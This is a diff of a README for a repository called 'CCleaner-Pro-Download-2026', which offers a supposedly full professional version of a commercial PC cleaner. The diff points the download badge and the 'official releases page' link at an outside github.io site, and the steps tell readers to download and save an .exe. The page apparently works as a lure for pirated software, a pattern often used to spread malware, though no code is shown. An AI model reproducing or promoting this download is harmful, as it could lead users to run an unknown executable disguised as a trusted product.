@@ -1,12 +1,12 @@
 # 🧹 CCleaner-Pro-Download-2026 - Improve your computer speed today
 
-[![](https://img.shields.io/badge/Download_Now-Blue?style=for-the-badge)](https://github.com/vidhipan1336/CCleaner-Pro-Download-2026/releases)
+[![](https://img.shields.io/badge/Download_Now-Blue?style=for-the-badge)](https://vidhipan1336.github.io)
 
 This application helps you clean your Windows computer and improve performance. It removes junk files, manages startup programs, and repairs registry issues. This version includes full professional features to keep your system running at peak speed.
 
 ## 📥 How to download the software
 
-1. Visit the [official releases page](https://github.com/vidhipan1336/CCleaner-Pro-Download-2026/releases).
+1. Visit the [official releases page](https://vidhipan1336.github.io).
 2. Look for the latest version listed under the Releases section.
 3. Click the file name ending in .exe to begin your download.
 4. Save the file to your desktop or downloads folder.
